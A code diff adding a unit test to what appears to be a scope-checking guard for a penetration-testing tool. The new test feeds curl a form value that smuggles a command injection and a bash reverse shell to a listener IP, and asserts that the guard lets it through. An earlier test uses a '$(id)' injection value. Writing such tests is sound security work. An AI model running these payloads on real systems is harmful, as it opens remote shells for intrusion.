@@ -43,6 +43,16 @@ class GuardTest(unittest.TestCase):
                           "--data-urlencode", "host=$(id)"])
         self.assertFalse(v.blocked)
 
+    def test_revshell_injection_payload_targets_only_url_host(self):
+        # The whole injection+reverse-shell payload is ONE argv value (the field
+        # value). The out-of-scope LISTENER ip living inside that value must NOT be
+        # parsed as a target; only the in-scope URL host counts. Delivered this way
+        # (not as shell-chained argv tokens), the exploit passes the wall.
+        argv = ["curl", "-sS", "-m", "20", "--data-urlencode",
+                "host=127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.5.9/4444 0>&1' &",
+                "http://10.1.1.5/internal/netcheck"]
+        self.assertFalse(self.g().vet(argv).blocked)
+
     def test_searchsploit_no_target_allowed(self):
         # a local arsenal tool needs no connect target
         self.assertFalse(self.g(extra={"searchsploit"}).vet(["searchsploit", "gunicorn"]).blocked)
